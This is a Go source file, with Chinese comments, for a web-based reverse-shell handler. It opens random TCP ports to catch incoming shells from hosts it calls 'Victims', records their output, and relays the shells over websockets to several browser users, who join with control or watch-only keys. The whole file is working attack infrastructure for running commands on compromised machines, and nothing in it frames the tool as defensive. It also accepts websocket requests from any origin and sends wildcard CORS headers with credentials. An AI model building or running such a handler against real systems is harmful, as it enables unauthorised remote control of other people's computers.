package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"math/rand"
	"net"
	"net/http"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  2048,
	WriteBufferSize: 2048,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

type App struct {
	HostIP   string
	Ports    []bool //已经占用的端口
	HighPort int    //最高端口
	LowPort  int    //最低端口
	Victims  []*Victim
}

func (app *App) createNewTCPConnection() (net.Listener, error) {
	port := rand.Intn(app.HighPort-app.LowPort) + app.LowPort
	for ok := true; ok; ok = app.Ports[port] {
		port = rand.Intn(app.HighPort-app.LowPort) + app.LowPort
	}
	//筛选出未被占用的端口
	app.Ports[port] = true //占用端口
	tcpListener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	return tcpListener, nil
}

type Victim struct {
	RemoteHost     string
	ListenPort     int
	ControlKey     string
	WatchKey       string
	History        string
	TCPConnection  net.Conn
	IsTCPConnected chan bool

	Users []*User
	Owner *User //当Owner关闭连接时所有用户统统关闭连接
}

func (v *Victim) Close() {
	v.TCPConnection.Close()
	for _, user := range v.Users {
		user.WSConn.Close()
	}
}
func (v *Victim) SendNoticeMessage(message string) {
	v.Owner.WSConn.WriteJSON(gin.H{"Type": 2, "data": message})
	for _, user := range v.Users {
		user.WSConn.WriteJSON(gin.H{"Type": 2, "data": message})
	}
}
func (v *Victim) SendShellMessage(message string) {
	v.Owner.WSConn.WriteJSON(gin.H{"Type": 0, "data": message})
	for _, user := range v.Users {
		user.WSConn.WriteJSON(gin.H{"Type": 0, "data": message})
	}
}
func (v *Victim) TCPListenHandler() {
	if <-v.IsTCPConnected {
		for {
			buffer := make([]byte, 2048)
			v.TCPConnection.Read(buffer)
			data := bytes.TrimRight(buffer, "\x00")
			v.History += string(data)
			v.SendShellMessage(string(data))
		}
	}

}

type User struct {
	Control bool //0为Watcher，1为Controller
	Name    string
	IP      string
	WSConn  *websocket.Conn
	Attack  *Victim
}

func (u *User) CommandHandler(command string) {
	//TODO
}
func (u *User) Leave(v *Victim) {
	v.Owner.WSConn.WriteJSON(gin.H{"Type": 2, "data": fmt.Sprintf("用户%s离开了shell", u.Name)})
	if len(v.Users) != 0 {
		for _, user := range v.Users {
			user.WSConn.WriteJSON(gin.H{"Type": 2, "data": fmt.Sprintf("用户%s离开了shell", u.Name)})
		}
	}
	u.WSConn.Close()
}
func (u *User) WebSockerHandler() {
	if u.Attack.History != "" {
		u.WSConn.WriteJSON(gin.H{"Type": 0, "data": u.Attack.History})
	}
	if u.Control {
		for {
			_, buffer, err := u.WSConn.ReadMessage()
			if err != nil {
				fmt.Println(err)
				return
			}
			message := &Message{}
			err = json.Unmarshal(buffer, message)
			if err != nil {
				fmt.Println(err)
				return
			}
			switch message.Type {
			case 0: //直接给shell
				databyte := []byte(message.Data)
				u.Attack.TCPConnection.Write(databyte)
				u.Attack.SendShellMessage(message.Data)
			case 1:
				u.CommandHandler(message.Data)
			default:
				continue
			}
		}
	}
}

type Message struct {
	Type int8   `json:"type"` //0为双向的shell中信息，1为C->S的命令信息，2为S->C的通知信息
	Data string `json:"data"`
}

var app *App

func getRandID() string {
	randChars := "abcdefghijklmnopqrstuvwxyz1234567890"
	id := ""
	for i := 0; i < 8; i++ {
		id += string(randChars[rand.Intn(len(randChars))])
	}
	return id
}
func Cors(c *gin.Context) {
	method := c.Request.Method
	origin := c.Request.Header.Get("Origin")
	if origin != "" {
		c.Header("Access-Control-Allow-Origin", "*") // 可将将 * 替换为指定的域名
		c.Header("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT, DELETE, UPDATE")
		c.Header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization")
		c.Header("Access-Control-Expose-Headers", "Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type")
		c.Header("Access-Control-Allow-Credentials", "true")
	}
	if method == "OPTIONS" {
		c.AbortWithStatus(http.StatusNoContent)
	}
	c.Next()
} //跨域
func createNewListener(c *gin.Context) {
	newVictim := &Victim{
		ControlKey: getRandID(),
		WatchKey:   getRandID(),
		History:    "",
	}
	cha := make(chan bool, 0)
	newVictim.IsTCPConnected = make(chan bool, 0)
	go func(v *Victim) {
		tcpListener, err := app.createNewTCPConnection()
		if err != nil {
			fmt.Println(err)
			return
		}
		v.ListenPort = tcpListener.Addr().(*net.TCPAddr).Port
		cha <- true
		v.TCPConnection, err = tcpListener.Accept()
		v.RemoteHost = v.TCPConnection.RemoteAddr().String()
		v.IsTCPConnected <- true
	}(newVictim)
	app.Victims = append(app.Victims, newVictim)
	if <-cha {
		c.JSON(200, gin.H{"Key": newVictim.ControlKey, "IP": app.HostIP, "Port": newVictim.ListenPort})
	}
}
func createNewWSConnection(c *gin.Context) {
	key := c.Query("key")
	name := c.Query("name")
	newUser := &User{
		Name: name,
		IP:   c.ClientIP(),
	}
	for _, victim := range app.Victims {
		var err error
		//分三种情况，一是还没连过Owner为空则首位为Owner，然后就是分别添加到Controller和Watcher
		if victim.ControlKey == key {
			if victim.Owner == nil {
				newUser.Control = true

				newUser.WSConn, err = upgrader.Upgrade(c.Writer, c.Request, nil)
				if err != nil {
					fmt.Println(err)
					c.JSON(500, gin.H{"error": "websocket建立失败"})
					return
				}
				newUser.WSConn.SetCloseHandler(func(code int, text string) error {
					newUser.WSConn.Close()
					if victim.TCPConnection != nil {
						victim.Close()
					}
					return nil
				})
				newUser.Attack = victim
				victim.Owner = newUser
				go victim.TCPListenHandler()
				break
			} else {
				newUser.Control = true
				newUser.WSConn, err = upgrader.Upgrade(c.Writer, c.Request, nil)
				if err != nil {
					fmt.Println(err)
					c.JSON(500, gin.H{"error": "websocket建立失败"})
					return
				}
				newUser.WSConn.SetCloseHandler(func(code int, text string) error {
					newUser.Leave(victim)
					return nil
				})
				newUser.Attack = victim
				victim.Users = append(victim.Users, newUser)
				break
			}
		} else if victim.WatchKey == key {
			newUser.Control = false

			newUser.WSConn, err = upgrader.Upgrade(c.Writer, c.Request, nil)
			if err != nil {
				fmt.Println(err)
				c.JSON(500, gin.H{"error": "websocket建立失败"})
				return
			}
			newUser.WSConn.SetCloseHandler(func(code int, text string) error {
				newUser.Leave(victim)
				return nil
			})
			newUser.Attack = victim
			victim.Users = append(victim.Users, newUser)
			break
		}
	}
	if newUser.WSConn == nil {
		c.JSON(404, gin.H{"error": "您输入的key无效，请重新输入"})
		return
	}
	newUser.Attack.SendNoticeMessage(fmt.Sprintf("用户%s已加入shell", newUser.Name))
	if newUser.Attack.TCPConnection == nil {
		newUser.Attack.SendNoticeMessage(fmt.Sprintf("反弹shell地址为：%s:%d", app.HostIP, newUser.Attack.ListenPort))
	}
	go newUser.WebSockerHandler()
}
func main() {
	app = &App{LowPort: 20000, HighPort: 50000, HostIP: "127.0.0.1", Ports: make([]bool, 65535)}
	httpServer := gin.Default()
	httpServer.Use(Cors)
	httpServer.GET("/createNewListener", createNewListener)
	httpServer.GET("/ws", createNewWSConnection)
	httpServer.Run(":8080")
}
